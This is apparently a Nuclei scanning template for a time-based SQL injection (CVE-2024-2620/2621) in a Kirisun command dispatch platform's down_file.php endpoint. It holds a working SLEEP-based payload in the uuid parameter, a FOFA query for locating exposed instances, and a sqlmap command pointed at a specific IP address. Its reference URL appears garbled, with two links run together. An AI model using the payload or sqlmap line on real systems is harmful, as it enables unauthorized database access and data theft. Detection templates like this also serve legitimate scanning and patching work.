id: kirisun-down_file-sqli
info:
  name: 福建科立讯通信指挥调度管理平台 down_file.php - sqli
  author: leadlife
  severity: high
  description: 福建科立讯通信 指挥调度管理平台 SQL注入漏洞复现(CVE-2024-2620、CVE-2024-2621)
  reference: 
    - http://www.sgqghttps://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0RCE.md.cn/news/256302.html
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="app/structure/departments.php" ||app="指挥调度管理平台"
    sqlmap: sqlmap -u "http://106.14.189.251:8081/api/client/down_file.php?uuid=1" -p uuid --batch --level 3 --risk 3
  tags: kirisun,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        GET /api/client/down_file.php?uuid=1%27%20AND%20(SELECT%205587%20FROM%20(SELECT(SLEEP(6)))pwaA)%20AND%20%27dDhF%27=%27dDhF HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123

    matchers:
      - type: dsl
        dsl:
          - duration >= 5 && duration < 9
          - status_code == 200
        condition: and